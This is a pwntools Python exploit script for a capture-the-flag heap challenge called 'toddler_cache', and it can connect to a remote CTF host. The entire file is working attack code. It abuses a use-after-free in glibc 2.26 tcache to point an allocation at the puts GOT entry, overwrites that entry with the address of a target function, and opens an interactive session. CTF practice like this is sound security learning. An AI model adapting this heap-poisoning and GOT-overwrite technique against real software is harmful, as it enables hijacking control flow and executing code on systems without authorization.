#!/usr/bin/env python

from pwn import *

BINARY = './ld-linux-x86-64.so.2'
LIBC = './libc-2.26.so'
HOST = 'cha.hackpack.club'
PORT = 41703

elf = ELF(BINARY)
libc = ELF(LIBC)

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
	script = ""
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process([BINARY, "./toddler_cache"], env={"LD_PRELOAD":LIBC})
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)



p = start()
if args.GDB:
    gdb.attach(p, 'b *0x400837')# 'b *0x00400b4d\nb *0x0400a85\nb *0x400a2e\nb *0x00400837')

entry_count = 0

def new_entry():
    p.sendlineafter("> > ", "1")
    global entry_count 
    entry_count += 1
    log.info("Entry count: {}".format(entry_count))

def write(index, value):
    log.info("Write")
    p.sendlineafter("> > ", "2")
    p.sendlineafter("> ", index)
    p.sendlineafter("write?\n", value)
    
def free(index):
    log.info("Free")
    p.sendlineafter("> > ", "3")
    p.sendlineafter("> > ", index)

# 
callme = p64(0x00400837)
malloc_hook = p64(0x7ffff7b90c10 - 16)
log.info("Malloc hook: {}".format(hex(0x00007ffff79e4000 + libc.symbols['__malloc_hook'])))
log.info("Malloc hook: {}".format(hex(libc.symbols['__malloc_hook'])))

puts_ptr = p64(0x00602020)
main = p64(0x00400b4e)

new_entry()
free("0")
#free("0")
write("0", puts_ptr)
new_entry()
new_entry()
write("2", callme)
    


p.interactive()
